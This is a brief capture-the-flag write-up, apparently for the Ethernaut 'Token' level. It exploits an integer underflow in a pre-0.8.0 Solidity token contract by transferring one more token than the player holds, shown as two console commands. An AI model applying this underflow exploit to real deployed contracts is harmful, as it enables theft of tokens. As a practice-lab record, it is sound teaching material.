#Token

Given the hint, odometers overflow when they reach their maximum limit. After looking online
solidity versions prior to 0.8.0 did not have safe math checks, therefore we can call
the transfer function with a value that is 1 greater than the balance we start out with.

> await contract.transfer("0x95A098E551497cC444486dc5D313c715868263C0", 21)

Note: The address we send to does not matter

> await contract.balanceOf(player).then(v => v.toString())

Confirms our overflow
